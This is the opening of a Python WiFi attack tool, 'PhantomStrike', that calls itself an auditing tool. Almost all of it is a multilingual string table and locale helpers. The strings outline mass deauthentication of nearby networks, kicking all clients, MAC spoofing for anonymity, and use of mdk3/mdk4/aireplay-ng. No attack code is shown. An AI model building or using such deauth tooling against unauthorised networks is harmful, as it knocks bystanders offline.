#!/usr/bin/env python3
# ============================================================
# PhantomStrike - Professional WiFi Auditing Tool
# Version: 3.0.0 (Multi-language support)
# Developed for Zorin OS (Ubuntu/Debian based)
# 
# LEGAL NOTICE:
# This tool is intended exclusively for authorized penetration
# testing on your own networks or with explicit permission from
# the owner. Unauthorized use is illegal.
#
# Copyright © 2026 Luís Garcês
# All rights reserved.
# ============================================================

import os
import sys
import time
import signal
import subprocess
import re
import glob
import shutil
import random
import locale

try:
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("scapy").setLevel(logging.ERROR)
except Exception:
    pass

# ============================================================
# ESTADO GLOBAL
# ============================================================
MAC_ORIGINAL = None
MAC_SPOOFED = False
FICHEIRO_CONFIG = os.path.expanduser("~/.phantomstrike_config")

# ============================================================
# SISTEMA DE TRADUÇÕES (i18n)
# ============================================================
IDIOMAS_DISPONIVEIS = {
    "pt": "🇵🇹 Português",
    "en": "🇬🇧 English",
    "zh": "🇨🇳 中文 (Chinese)",
    "ru": "🇷🇺 Русский (Russian)"
}

TRADUCOES = {
    # --- BANNER & CABEÇALHO ---
    "banner_title": {
        "pt": "S T R I K E   P R O F E S S I O N A L",
        "en": "S T R I K E   P R O F E S S I O N A L",
        "zh": "专 业 攻 击 工 具",
        "ru": "П Р О Ф Е С С И О Н А Л Ь Н Ы Й   У Д А Р"
    },
    "banner_subtitle": {
        "pt": "Ferramenta de Auditoria de Redes WiFi",
        "en": "Professional WiFi Auditing Tool",
        "zh": "专业WiFi网络审计工具",
        "ru": "Профессиональный инструмент аудита WiFi"
    },
    "banner_copyright": {
        "pt": "Uso exclusivo para testes autorizados",
        "en": "For authorized testing only",
        "zh": "仅限授权测试使用",
        "ru": "Только для авторизованного тестирования"
    },
    "menu_interface": {
        "pt": "Interface",
        "en": "Interface",
        "zh": "接口",
        "ru": "Интерфейс"
    },
    "menu_mode": {
        "pt": "Modo",
        "en": "Mode",
        "zh": "模式",
        "ru": "Режим"
    },
    "menu_mac": {
        "pt": "MAC",
        "en": "MAC",
        "zh": "MAC地址",
        "ru": "MAC"
    },
    "menu_tools": {
        "pt": "Ferramentas",
        "en": "Tools",
        "zh": "工具",
        "ru": "Инструменты"
    },
    "mac_spoofed": {
        "pt": "(SPOOFED)",
        "en": "(SPOOFED)",
        "zh": "(已伪装)",
        "ru": "(ПОДМЕНЕН)"
    },
    "mac_original": {
        "pt": "(Original)",
        "en": "(Original)",
        "zh": "(原始)",
        "ru": "(Оригинал)"
    },

    # --- SECÇÕES DO MENU ---
    "menu_scan_module": {
        "pt": "MÓDULO DE SCAN",
        "en": "SCAN MODULE",
        "zh": "扫描模块",
        "ru": "МОДУЛЬ СКАНИРОВАНИЯ"
    },
    "menu_attack_module": {
        "pt": "MÓDULO DE ATAQUE",
        "en": "ATTACK MODULE",
        "zh": "攻击模块",
        "ru": "МОДУЛЬ АТАКИ"
    },
    "menu_system_module": {
        "pt": "SISTEMA E ANONIMATO",
        "en": "SYSTEM & ANONYMITY",
        "zh": "系统与匿名",
        "ru": "СИСТЕМА И АНОНИМНОСТЬ"
    },

    # --- OPÇÕES DO MENU ---
    "opt_scan_ap": {
        "pt": "Scan de Access Points WiFi",
        "en": "Scan WiFi Access Points",
        "zh": "扫描WiFi接入点",
        "ru": "Сканирование WiFi точек доступа"
    },
    "opt_scan_hosts": {
        "pt": "Scan de hosts na rede local",
        "en": "Scan local network hosts",
        "zh": "扫描本地网络主机",
        "ru": "Сканирование хостов локальной сети"
    },
    "opt_deauth_one": {
        "pt": "Deauth a UMA rede específica",
        "en": "Deauth ONE specific network",
        "zh": "去认证一个特定网络",
        "ru": "Деаутентификация ОДНОЙ сети"
    },
    "opt_deauth_multi": {
        "pt": "Deauth a MÚLTIPLAS redes (só com clientes)",
        "en": "Deauth MULTIPLE networks (with clients only)",
        "zh": "去认证多个网络(仅含客户端)",
        "ru": "Деаутентификация НЕСКОЛЬКИХ сетей (только с клиентами)"
    },
    "opt_deauth_all": {
        "pt": "Deauth a TODAS as redes (só com clientes)",
        "en": "Deauth ALL networks (with clients only)",
        "zh": "去认证所有网络(仅含客户端)",
        "ru": "Деаутентификация ВСЕХ сетей (только с клиентами)"
    },
    "opt_kick_one": {
        "pt": "Expulsar UM cliente da rede",
        "en": "Kick ONE client off the network",
        "zh": "踢出一个客户端",
        "ru": "Выгнать ОДНОГО клиента из сети"
    },
    "opt_kick_multi": {
        "pt": "Expulsar MÚLTIPLOS clientes",
        "en": "Kick MULTIPLE clients",
        "zh": "踢出多个客户端",
        "ru": "Выгнать НЕСКОЛЬКО клиентов"
    },
    "opt_kick_all": {
        "pt": "Expulsar TODOS os clientes (excepto tu)",
        "en": "Kick ALL clients (except you)",
        "zh": "踢出所有客户端(除自己外)",
        "ru": "Выгнать ВСЕХ клиентов (кроме вас)"
    },
    "opt_mac_spoof": {
        "pt": "Gerar MAC Aleatório (Spoofing)",
        "en": "Generate Random MAC (Spoofing)",
        "zh": "生成随机MAC(伪装)",
        "ru": "Сгенерировать случайный MAC (Спуфинг)"
    },
    "opt_restore": {
        "pt": "Restaurar definições de rede e MAC",
        "en": "Restore network settings and MAC",
        "zh": "恢复网络设置和MAC",
        "ru": "Восстановить настройки сети и MAC"
    },
    "opt_exit": {
        "pt": "Sair do PhantomStrike",
        "en": "Exit PhantomStrike",
        "zh": "退出 PhantomStrike",
        "ru": "Выйти из PhantomStrike"
    },
    "opt_language": {
        "pt": "Alterar idioma / Change language",
        "en": "Change language / 更改语言",
        "zh": "更改语言 / Сменить язык",
        "ru": "Сменить язык / 更改语言"
    },

    # --- MENSAGENS DE STATUS ---
    "msg_starting_scan": {
        "pt": "A iniciar scan contínuo de Access Points em",
        "en": "Starting continuous Access Points scan on",
        "zh": "正在开始持续扫描接入点",
        "ru": "Начало непрерывного сканирования точек доступа на"
    },
    "msg_scan_update": {
        "pt": "A lista será atualizada automaticamente a cada 2 segundos.",
        "en": "The list will update automatically every 2 seconds.",
        "zh": "列表将每2秒自动更新。",
        "ru": "Список будет обновляться автоматически каждые 2 секунды."
    },
    "msg_ctrlc_stop": {
        "pt": "Pressiona CTRL+C para parar e selecionar um alvo.",
        "en": "Press CTRL+C to stop and select a target.",
        "zh": "按 CTRL+C 停止并选择目标。",
        "ru": "Нажмите CTRL+C для остановки и выбора цели."
    },
    "msg_monitor_enabled": {
        "pt": "Modo monitor ativado",
        "en": "Monitor mode enabled",
        "zh": "监控模式已启用",
        "ru": "Режим монитора включен"
    },
    "msg_monitor_failed": {
        "pt": "ERRO: Falha ao ativar modo monitor.",
        "en": "ERROR: Failed to enable monitor mode.",
        "zh": "错误: 无法启用监控模式。",
        "ru": "ОШИБКА: Не удалось включить режим монитора."
    },
    "msg_scan_running": {
        "pt": "Scan contínuo em execução",
        "en": "Continuous scan running",
        "zh": "持续扫描运行中",
        "ru": "Непрерывное сканирование выполняется"
    },
    "msg_aps_detected": {
        "pt": "Access Point(s) detetado(s)",
        "en": "Access Point(s) detected",
        "zh": "检测到接入点",
        "ru": "Точек доступа обнаружено"
    },
    "msg_aps_found": {
        "pt": "Access Point(s) encontrados",
        "en": "Access Point(s) found",
        "zh": "找到接入点",
        "ru": "Точек доступа найдено"
    },
    "msg_total_clients": {
        "pt": "Total de clientes conectados",
        "en": "Total connected clients",
        "zh": "总连接客户端数",
        "ru": "Всего подключенных клиентов"
    },
    "msg_waiting_networks": {
        "pt": "A aguardar redes... (Ainda nenhuma detetada)",
        "en": "Waiting for networks... (None detected yet)",
        "zh": "等待网络...(尚未检测到)",
        "ru": "Ожидание сетей... (Пока не обнаружено)"
    },
    "msg_check_antenna": {
        "pt": "Verifica se estás perto de redes WiFi e se a antena está ligada.",
        "en": "Check if you're near WiFi networks and if the antenna is connected.",
        "zh": "检查是否在WiFi网络附近以及天线是否已连接。",
        "ru": "Проверьте, находитесь ли вы рядом с WiFi сетями и подключена ли антенна."
    },
    "msg_legend": {
        "pt": "Legenda",
        "en": "Legend",
        "zh": "图例",
        "ru": "Легенда"
    },
    "msg_scan_interrupted": {
        "pt": "Scan interrompido pelo utilizador.",
        "en": "Scan interrupted by user.",
        "zh": "用户中断扫描。",
        "ru": "Сканирование прервано пользователем."
    },
    "msg_no_aps_found": {
        "pt": "Nenhum Access Point encontrado durante o scan.",
        "en": "No Access Points found during scan.",
        "zh": "扫描期间未找到接入点。",
        "ru": "Во время сканирования точки доступа не найдены."
    },
    "msg_scan_concluded": {
        "pt": "Scan concluído. Lista final de Access Points",
        "en": "Scan concluded. Final Access Points list",
        "zh": "扫描完成。最终接入点列表",
        "ru": "Сканирование завершено. Финальный список точек доступа"
    },
    "msg_hidden": {
        "pt": "<OCULTO>",
        "en": "<HIDDEN>",
        "zh": "<隐藏>",
        "ru": "<СКРЫТО>"
    },
    "msg_new_client": {
        "pt": "[NOVO CLIENTE]",
        "en": "[NEW CLIENT]",
        "zh": "[新客户端]",
        "ru": "[НОВЫЙ КЛИЕНТ]"
    },

    # --- ATAQUES ---
    "msg_select_ap": {
        "pt": "Seleciona o nº do Access Point a atacar (ou 0 para cancelar)",
        "en": "Select the Access Point number to attack (or 0 to cancel)",
        "zh": "选择要攻击的接入点编号(或0取消)",
        "ru": "Выберите номер точки доступа для атаки (или 0 для отмены)"
    },
    "msg_cancelled": {
        "pt": "Operação cancelada.",
        "en": "Operation cancelled.",
        "zh": "操作已取消。",
        "ru": "Операция отменена."
    },
    "msg_invalid_option": {
        "pt": "Opção inválida.",
        "en": "Invalid option.",
        "zh": "无效选项。",
        "ru": "Неверный вариант."
    },
    "msg_invalid_input": {
        "pt": "Entrada inválida.",
        "en": "Invalid input.",
        "zh": "无效输入。",
        "ru": "Неверный ввод."
    },
    "msg_selected_target": {
        "pt": "Alvo selecionado",
        "en": "Selected target",
        "zh": "已选择目标",
        "ru": "Выбрана цель"
    },
    "msg_clients_connected_ap": {
        "pt": "CLIENTES CONECTADOS AO AP",
        "en": "CLIENTS CONNECTED TO AP",
        "zh": "连接到AP的客户端",
        "ru": "КЛИЕНТЫ ПОДКЛЮЧЕНЫ К ТОЧКЕ ДОСТУПА"
    },
    "msg_ap_label": {
        "pt": "AP",
        "en": "AP",
        "zh": "接入点",
        "ru": "ТД"
    },
    "msg_total_clients_ap": {
        "pt": "Total de clientes",
        "en": "Total clients",
        "zh": "客户端总数",
        "ru": "Всего клиентов"
    },
    "msg_no_clients_ap": {
        "pt": "Este AP não tem clientes conectados.",
        "en": "This AP has no connected clients.",
        "zh": "此AP没有连接的客户端。",
        "ru": "У этой точки доступа нет подключенных клиентов."
    },
    "msg_attack_may_not_work": {
        "pt": "O ataque de deauth pode não ter efeito visível.",
        "en": "The deauth attack may have no visible effect.",
        "zh": "去认证攻击可能没有明显效果。",
        "ru": "Атака деаутентификации может не иметь видимого эффекта."
    },
    "msg_continue_anyway": {
        "pt": "Continuar mesmo sem clientes detetados? (s/n)",
        "en": "Continue anyway without detected clients? (y/n)",
        "zh": "即使没有检测到客户端也要继续?(y/n)",
        "ru": "Продолжить без обнаруженных клиентов? (y/n)"
    },
    "msg_connected": {
        "pt": "CONECTADO",
        "en": "CONNECTED",
        "zh": "已连接",
        "ru": "ПОДКЛЮЧЕН"
    },
    "msg_attacking_clients": {
        "pt": "A atacar",
        "en": "Attacking",
        "zh": "正在攻击",
        "ru": "Атака"
    },
    "msg_client_label": {
        "pt": "cliente(s) detetado(s)",
        "en": "client(s) detected",
        "zh": "检测到客户端",
        "ru": "клиент(ов) обнаружено"
    },
    "msg_attacking_client": {
        "pt": "A atacar cliente",
        "en": "Attacking client",
        "zh": "正在攻击客户端",
        "ru": "Атака клиента"
    },
    "msg_broadcast_attack": {
        "pt": "A executar ataque broadcast (todos os clientes)",
        "en": "Executing broadcast attack (all clients)",
        "zh": "执行广播攻击(所有客户端)",
        "ru": "Выполнение широковещательной атаки (все клиенты)"
    },
    "msg_aps_with_clients": {
        "pt": "APs com clientes conectados",
        "en": "APs with connected clients",
        "zh": "有连接客户端的AP",
        "ru": "ТД с подключенными клиентами"
    },
    "msg_no_aps_with_clients": {
        "pt": "Nenhum Access Point com clientes conectados.",
        "en": "No Access Points with connected clients.",
        "zh": "没有带连接客户端的接入点。",
        "ru": "Нет точек доступа с подключенными клиентами."
    },
    "msg_select_comma": {
        "pt": "Seleciona os nºs separados por vírgula (ex: 1,3,5)",
        "en": "Select numbers separated by comma (ex: 1,3,5)",
        "zh": "选择编号,用逗号分隔(如: 1,3,5)",
        "ru": "Выберите номера через запятую (например: 1,3,5)"
    },
    "msg_no_valid_selection": {
        "pt": "Nenhuma seleção válida.",
        "en": "No valid selection.",
        "zh": "没有有效选择。",
        "ru": "Нет действительного выбора."
    },
    "msg_warning_all_aps": {
        "pt": "AVISO: Vais atacar TODOS os",
        "en": "WARNING: You will attack ALL",
        "zh": "警告: 你将攻击所有",
        "ru": "ВНИМАНИЕ: Вы атакуете ВСЕ"
    },
    "msg_aps_with_clients_lower": {
        "pt": "APs com clientes",
        "en": "APs with clients",
        "zh": "带客户端的AP",
        "ru": "ТД с клиентами"
    },
    "msg_confirm": {
        "pt": "Confirmar? (s/n)",
        "en": "Confirm? (y/n)",
        "zh": "确认? (y/n)",
        "ru": "Подтвердить? (y/n)"
    },

    # --- DEAUTH METHODS ---
    "method_select_title": {
        "pt": "SELECIONAR MÉTODO DE DEAUTHENTICATION",
        "en": "SELECT DEAUTHENTICATION METHOD",
        "zh": "选择去认证方法",
        "ru": "ВЫБОР МЕТОДА ДЕАУТЕНТИФИКАЦИИ"
    },
    "method_scapy": {
        "pt": "Scapy - Envio de pacotes via Python (preciso)",
        "en": "Scapy - Packet sending via Python (precise)",
        "zh": "Scapy - 通过Python发送数据包(精确)",
        "ru": "Scapy - Отправка пакетов через Python (точно)"
    },
    "method_aireplay": {
        "pt": "aireplay-ng - Método clássico do Aircrack-ng",
        "en": "aireplay-ng - Classic Aircrack-ng method",
        "zh": "aireplay-ng - Aircrack-ng经典方法",
        "ru": "aireplay-ng - Классический метод Aircrack-ng"
    },
    "method_mdk3": {
        "pt": "mdk3 - Ataque agressivo em massa (MUITO EFICAZ)",
        "en": "mdk3 - Aggressive mass attack (VERY EFFECTIVE)",
        "zh": "mdk3 - 激进的大规模攻击(非常有效)",
        "ru": "mdk3 - Агрессивная массовая атака (ОЧЕНЬ ЭФФЕКТИВНО)"
    },
    "method_mdk4": {
        "pt": "mdk4 - Versão moderna do MDK (RECOMENDADO)",
        "en": "mdk4 - Modern MDK version (RECOMMENDED)",
        "zh": "mdk4 - 现代MDK版本(推荐)",
        "ru": "mdk4 - Современная версия MDK (РЕКОМЕНДУЕТСЯ)"
    },
    "msg_no_deauth_tools": {
        "pt": "ERRO: Nenhuma ferramenta de deauth disponível!",
        "en": "ERROR: No deauth tools available!",
        "zh": "错误: 没有可用的去认证工具!",
        "ru": "ОШИБКА: Нет доступных инструментов деаутентификации!"
    },
    "msg_select_method": {
        "pt": "Seleciona o método",
        "en": "Select the method",
        "zh": "选择方法",
        "ru": "Выберите метод"
    },
    "msg_method_selected": {
        "pt": "Método selecionado",
        "en": "Method selected",
        "zh": "已选择方法",
        "ru": "Метод выбран"
    },
    "msg_using_default_method": {
        "pt": "Opção inválida. A usar método padrão...",
        "en": "Invalid option. Using default method...",
        "zh": "无效选项。使用默认方法...",
        "ru": "Неверный вариант. Используется метод по умолчанию..."
    },

    # --- DEAUTH ATTACK FEEDBACK ---
    "attack_scapy_title": {
        "pt": "ATAQUE DE DEAUTH VIA SCAPY",
        "en": "DEAUTH ATTACK VIA SCAPY",
        "zh": "通过SCAPY去认证攻击",
        "ru": "АТАКА ДЕАУТЕНТИФИКАЦИИ ЧЕРЕЗ SCAPY"
    },
    "attack_aireplay_title": {
        "pt": "ATAQUE DE DEAUTH VIA AIREPLAY-NG",
        "en": "DEAUTH ATTACK VIA AIREPLAY-NG",
        "zh": "通过AIREPLAY-NG去认证攻击",
        "ru": "АТАКА ДЕАУТЕНТИФИКАЦИИ ЧЕРЕЗ AIREPLAY-NG"
    },
    "attack_mdk3_title": {
        "pt": "ATAQUE DE DEAUTH VIA MDK3 (AGRESSIVO)",
        "en": "DEAUTH ATTACK VIA MDK3 (AGGRESSIVE)",
        "zh": "通过MDK3去认证攻击(激进)",
        "ru": "АТАКА ДЕАУТЕНТИФИКАЦИИ ЧЕРЕЗ MDK3 (АГРЕССИВНАЯ)"
    },
    "attack_mdk4_title": {
        "pt": "ATAQUE DE DEAUTH VIA MDK4 (RECOMENDADO)",
        "en": "DEAUTH ATTACK VIA MDK4 (RECOMMENDED)",
        "zh": "通过MDK4去认证攻击(推荐)",
        "ru": "АТАКА ДЕАУТЕНТИФИКАЦИИ ЧЕРЕЗ MDK4 (РЕКОМЕНДУЕТСЯ)"
    },
    "msg_target_bssid": {
        "pt": "Alvo BSSID",
        "en": "Target BSSID",
        "zh": "目标BSSID",
        "ru": "Цель BSSID"
    },
    "msg_client_mac": {
        "pt": "Cliente MAC",
        "en": "Client MAC",
        "zh": "客户端MAC",
        "ru": "MAC клиента"
    },
    "msg_packets_to_send": {
        "pt": "Pacotes a enviar",
        "en": "Packets to send",
        "zh": "要发送的数据包",
        "ru": "Пакетов к отправке"
    },
    "msg_duration": {
        "pt": "Duração",
        "en": "Duration",
        "zh": "持续时间",
        "ru": "Длительность"
    },
    "msg_seconds": {
        "pt": "segundos",
        "en": "seconds",
        "zh": "秒",
        "ru": "секунд"
    },
    "msg_mdk3_warning": {
        "pt": "⚠  MDK3 é muito agressivo!",
        "en": "⚠  MDK3 is very aggressive!",
        "zh": "⚠  MDK3非常激进!",
        "ru": "⚠  MDK3 очень агрессивен!"
    },
    "msg_sending_packets": {
        "pt": "A enviar pacotes...",
        "en": "Sending packets...",
        "zh": "正在发送数据包...",
        "ru": "Отправка пакетов..."
    },
    "msg_packet_sent": {
        "pt": "Pacote",
        "en": "Packet",
        "zh": "数据包",
        "ru": "Пакет"
    },
    "msg_sent_to": {
        "pt": "enviado →",
        "en": "sent →",
        "zh": "已发送 →",
        "ru": "отправлен →"
    },
    "msg_error_sending_packet": {
        "pt": "Erro ao enviar pacote",
        "en": "Error sending packet",
        "zh": "发送数据包时出错",
        "ru": "Ошибка отправки пакета"
    },
    "msg_total_packets_sent": {
        "pt": "TOTAL",
        "en": "TOTAL",
        "zh": "总计",
        "ru": "ИТОГО"
    },
    "msg_packets_sent_success": {
        "pt": "pacotes de deauth enviados com sucesso!",
        "en": "deauth packets sent successfully!",
        "zh": "去认证数据包发送成功!",
        "ru": "пакетов деаутентификации успешно отправлено!"
    },
    "msg_fatal_error_scapy": {
        "pt": "Erro fatal no Scapy",
        "en": "Fatal error in Scapy",
        "zh": "Scapy致命错误",
        "ru": "Критическая ошибка в Scapy"
    },
    "msg_running_command": {
        "pt": "A executar",
        "en": "Running",
        "zh": "正在执行",
        "ru": "Выполняется"
    },
    "msg_attack_concluded_aireplay": {
        "pt": "Ataque concluído via aireplay-ng!",
        "en": "Attack concluded via aireplay-ng!",
        "zh": "通过aireplay-ng攻击完成!",
        "ru": "Атака завершена через aireplay-ng!"
    },
    "msg_aireplay_exit_code": {
        "pt": "aireplay-ng terminou com código",
        "en": "aireplay-ng finished with code",
        "zh": "aireplay-ng以代码结束",
        "ru": "aireplay-ng завершился с кодом"
    },
    "msg_mdk_attacking_remaining": {
        "pt": "a atacar...",
        "en": "attacking...",
        "zh": "正在攻击...",
        "ru": "атакует..."
    },
    "msg_remaining": {
        "pt": "restantes",
        "en": "remaining",
        "zh": "剩余",
        "ru": "осталось"
    },
    "msg_mdk_concluded": {
        "pt": "Ataque",
        "en": "Attack",
        "zh": "攻击",
        "ru": "Атака"
    },
    "msg_concluded_after": {
        "pt": "concluído após",
        "en": "concluded after",
        "zh": "完成后经过",
        "ru": "завершена через"
    },
    "msg_error_mdk": {
        "pt": "Erro no",
        "en": "Error in",
        "zh": "错误",
        "ru": "Ошибка в"
    },
    "msg_no_deauth_method": {
        "pt": "Nenhum método de deauth disponível!",
        "en": "No deauth method available!",
        "zh": "没有可用的去认证方法!",
        "ru": "Нет доступного метода деаутентификации!"
    },
    "msg_unknown_method": {
        "pt": "Método desconhecido",
        "en": "Unknown method",
        "zh": "未知方法",
        "ru": "Неизвестный метод"
    },

    # --- PARÂMETROS ---
    "msg_duration_prompt": {
        "pt": "Duração do ataque em segundos",
        "en": "Attack duration in seconds",
        "zh": "攻击持续时间(秒)",
        "ru": "Длительность атаки в секундах"
    },
    "msg_packets_prompt": {
        "pt": "Número de pacotes",
        "en": "Number of packets",
        "zh": "数据包数量",
        "ru": "Количество пакетов"
    },
    "msg_duration_per_target": {
        "pt": "Duração por alvo em segundos",
        "en": "Duration per target in seconds",
        "zh": "每个目标持续时间(秒)",
        "ru": "Длительность на цель в секундах"
    },
    "msg_packets_per_target": {
        "pt": "Pacotes por alvo",
        "en": "Packets per target",
        "zh": "每个目标的数据包",
        "ru": "Пакетов на цель"
    },
    "msg_duration_per_client": {
        "pt": "Duração por cliente em segundos",
        "en": "Duration per client in seconds",
        "zh": "每个客户端持续时间(秒)",
        "ru": "Длительность на клиента в секундах"
    },
    "msg_packets_per_client": {
        "pt": "Pacotes por cliente",
        "en": "Packets per client",
        "zh": "每个客户端的数据包",
        "ru": "Пакетов на клиента"
    },

    # --- KICK CLIENTS ---
    "msg_searching_clients": {
        "pt": "A procurar clientes na rede...",
        "en": "Searching for clients on the network...",
        "zh": "正在搜索网络上的客户端...",
        "ru": "Поиск клиентов в сети..."
    },
    "msg_no_clients_found": {
        "pt": "Nenhum cliente encontrado.",
        "en": "No clients found.",
        "zh": "未找到客户端。",
        "ru": "Клиенты не найдены."
    },
    "msg_select_client": {
        "pt": "Seleciona o nº do cliente a expulsar",
        "en": "Select the client number to kick",
        "zh": "选择要踢出的客户端编号",
        "ru": "Выберите номер клиента для выгона"
    },
    "msg_target_label": {
        "pt": "Alvo",
        "en": "Target",
        "zh": "目标",
        "ru": "Цель"
    },
    "msg_kicking": {
        "pt": "A expulsar",
        "en": "Kicking",
        "zh": "正在踢出",
        "ru": "Выгон"
    },
    "msg_operations_concluded": {
        "pt": "Operações concluídas.",
        "en": "Operations concluded.",
        "zh": "操作已完成。",
        "ru": "Операции завершены."
    },
    "msg_warning_kick_all": {
        "pt": "AVISO: Vais expulsar TODOS os",
        "en": "WARNING: You will kick ALL",
        "zh": "警告: 你将踢出所有",
        "ru": "ВНИМАНИЕ: Вы выгоните ВСЕХ"
    },
    "msg_clients_except_you": {
        "pt": "clientes (excepto tu)",
        "en": "clients (except you)",
        "zh": "客户端(除你之外)",
        "ru": "клиентов (кроме вас)"
    },
    "msg_all_clients_kicked": {
        "pt": "Todos os clientes expulsos com sucesso.",
        "en": "All clients kicked successfully.",
        "zh": "所有客户端已成功踢出。",
        "ru": "Все клиенты успешно выгнаны."
    },

    # --- SCAN HOSTS ---
    "msg_searching_hosts": {
        "pt": "A procurar hosts na rede local...",
        "en": "Searching for hosts on local network...",
        "zh": "正在搜索本地网络主机...",
        "ru": "Поиск хостов в локальной сети..."
    },
    "msg_error_get_ip": {
        "pt": "ERRO: Não foi possível obter o IP da interface",
        "en": "ERROR: Could not get IP from interface",
        "zh": "错误: 无法获取接口IP",
        "ru": "ОШИБКА: Не удалось получить IP интерфейса"
    },
    "msg_subnet_detected": {
        "pt": "Subrede detetada",
        "en": "Subnet detected",
        "zh": "检测到子网",
        "ru": "Подсеть обнаружена"
    },
    "msg_using_arp_scan": {
        "pt": "A utilizar arp-scan...",
        "en": "Using arp-scan...",
        "zh": "使用arp-scan...",
        "ru": "Использование arp-scan..."
    },
    "msg_arp_unavailable": {
        "pt": "arp-scan indisponível. A utilizar nmap...",
        "en": "arp-scan unavailable. Using nmap...",
        "zh": "arp-scan不可用。使用nmap...",
        "ru": "arp-scan недоступен. Используется nmap..."
    },
    "msg_no_hosts_found": {
        "pt": "Nenhum host encontrado.",
        "en": "No hosts found.",
        "zh": "未找到主机。",
        "ru": "Хосты не найдены."
    },
    "msg_manufacturer": {
        "pt": "Fabricante",
        "en": "Manufacturer",
        "zh": "制造商",
        "ru": "Производитель"
    },
    "msg_unknown": {
        "pt": "Desconhecido",
        "en": "Unknown",
        "zh": "未知",
        "ru": "Неизвестно"
    },

    # --- MAC SPOOFING ---
    "msg_mac_already_changed": {
        "pt": "O MAC já foi alterado. Usa a opção 9 para restaurar.",
        "en": "MAC already changed. Use option 9 to restore.",
        "zh": "MAC已更改。使用选项9恢复。",
        "ru": "MAC уже изменен. Используйте опцию 9 для восстановления."
    },
    "msg_changing_mac": {
        "pt": "A alterar MAC da interface",
        "en": "Changing MAC of interface",
        "zh": "正在更改接口MAC",
        "ru": "Изменение MAC интерфейса"
    },
    "msg_original_mac": {
        "pt": "MAC Original",
        "en": "Original MAC",
        "zh": "原始MAC",
        "ru": "Оригинальный MAC"
    },
    "msg_error_read_mac": {
        "pt": "ERRO: Não foi possível ler o MAC original.",
        "en": "ERROR: Could not read original MAC.",
        "zh": "错误: 无法读取原始MAC。",
        "ru": "ОШИБКА: Не удалось прочитать оригинальный MAC."
    },
    "msg_mac_changed_success": {
        "pt": "MAC alterado com sucesso para",
        "en": "MAC successfully changed to",
        "zh": "MAC已成功更改为",
        "ru": "MAC успешно изменен на"
    },
    "msg_mac_change_failed": {
        "pt": "Falha ao alterar o MAC.",
        "en": "Failed to change MAC.",
        "zh": "更改MAC失败。",
        "ru": "Не удалось изменить MAC."
    },
    "msg_restoring_mac": {
        "pt": "A restaurar MAC original da interface",
        "en": "Restoring original MAC of interface",
        "zh": "正在恢复接口原始MAC",
        "ru": "Восстановление оригинального MAC интерфейса"
    },
    "msg_mac_restored": {
        "pt": "MAC restaurado para",
        "en": "MAC restored to",
        "zh": "MAC已恢复为",
        "ru": "MAC восстановлен на"
    },

    # --- RESTORE NETWORK ---
    "msg_restoring_network": {
        "pt": "A restaurar definições de rede para",
        "en": "Restoring network settings for",
        "zh": "正在恢复网络设置",
        "ru": "Восстановление настроек сети для"
    },
    "msg_interface_restored": {
        "pt": "Interface",
        "en": "Interface",
        "zh": "接口",
        "ru": "Интерфейс"
    },
    "msg_restored_managed": {
        "pt": "restaurada para modo managed.",
        "en": "restored to managed mode.",
        "zh": "已恢复为managed模式。",
        "ru": "восстановлен в управляемый режим."
    },

    # --- LANGUAGE SELECTION ---
    "msg_select_language": {
        "pt": "Seleciona o idioma / Select language / 选择语言 / Выберите язык",
        "en": "Select language / Seleciona o idioma / 选择语言 / Выберите язык",
        "zh": "选择语言 / Select language / Seleciona o idioma / Выберите язык",
        "ru": "Выберите язык / Select language / Seleciona o idioma / 选择语言"
    },
    "msg_language_changed": {
        "pt": "Idioma alterado para",
        "en": "Language changed to",
        "zh": "语言已更改为",
        "ru": "Язык изменен на"
    },
    "msg_invalid_language": {
        "pt": "Opção inválida. Idioma não alterado.",
        "en": "Invalid option. Language not changed.",
        "zh": "无效选项。语言未更改。",
        "ru": "Неверный вариант. Язык не изменен."
    },

    # --- EXIT & ERRORS ---
    "msg_cleaning_exit": {
        "pt": "A limpar e a sair...",
        "en": "Cleaning up and exiting...",
        "zh": "正在清理并退出...",
        "ru": "Очистка и выход..."
    },
    "msg_goodbye": {
        "pt": "Até à próxima!",
        "en": "See you next time!",
        "zh": "下次见!",
        "ru": "До встречи!"
    },
    "msg_invalid_option_menu": {
        "pt": "Opção inválida. Tenta novamente.",
        "en": "Invalid option. Try again.",
        "zh": "无效选项。请重试。",
        "ru": "Неверный вариант. Попробуйте снова."
    },
    "msg_error_root": {
        "pt": "ERRO: Este programa necessita de ser executado como root.",
        "en": "ERROR: This program needs to be run as root.",
        "zh": "错误: 此程序需要以root权限运行。",
        "ru": "ОШИБКА: Эта программа должна запускаться от root."
    },
    "msg_use_sudo": {
        "pt": "Utiliza: sudo python3 phantomstrike.py",
        "en": "Use: sudo python3 phantomstrike.py",
        "zh": "使用: sudo python3 phantomstrike.py",
        "ru": "Используйте: sudo python3 phantomstrike.py"
    },
    "msg_press_enter": {
        "pt": "Pressiona Enter para continuar...",
        "en": "Press Enter to continue...",
        "zh": "按回车键继续...",
        "ru": "Нажмите Enter для продолжения..."
    },
    "msg_version": {
        "pt": "PhantomStrike v3.0 | Copyright © 2026 Luís Garcês",
        "en": "PhantomStrike v3.0 | Copyright © 2026 Luís Garcês",
        "zh": "PhantomStrike v3.0 | 版权所有 © 2026 Luís Garcês",
        "ru": "PhantomStrike v3.0 | Авторские права © 2026 Luís Garcês"
    },
    "msg_prompt": {
        "pt": "phantomstrike#> ",
        "en": "phantomstrike#> ",
        "zh": "phantomstrike#> ",
        "ru": "phantomstrike#> "
    }
}

# ============================================================
# FUNÇÕES DE TRADUÇÃO
# ============================================================
def detetar_idioma_sistema():
    """Deteta o idioma do sistema operativo."""
    try:
        lang = locale.getdefaultlocale()[0]
        if lang:
            lang = lang[:2].lower()
            if lang in IDIOMAS_DISPONIVEIS:
                return lang
    except Exception:
        pass
    return "pt"  # Padrão: Português

def carregar_idioma():
    """Carrega o idioma guardado na configuração ou deteta do sistema."""
    try:
        if os.path.exists(FICHEIRO_CONFIG):
            with open(FICHEIRO_CONFIG, "r") as f:
                config = f.read().strip()
                if config in IDIOMAS_DISPONIVEIS:
                    return config
    except Exception:
        pass
    return detetar_idioma_sistema()

def guardar_idioma(idioma):
    """Guarda o idioma preferido no ficheiro de configuração."""
    try:
        with open(FICHEIRO_CONFIG, "w") as f:
            f.write(idioma)
    except Exception:
        pass

def t(chave):
    """Função de tradução: retorna a string no idioma atual."""
    global idioma_atual
    if chave in TRADUCOES:
        return TRADUCOES[chave].get(idioma_atual, TRADUCOES[chave].get("pt", chave))
    return chave

# Carregar idioma ao iniciar
idioma_atual = carregar_idioma()

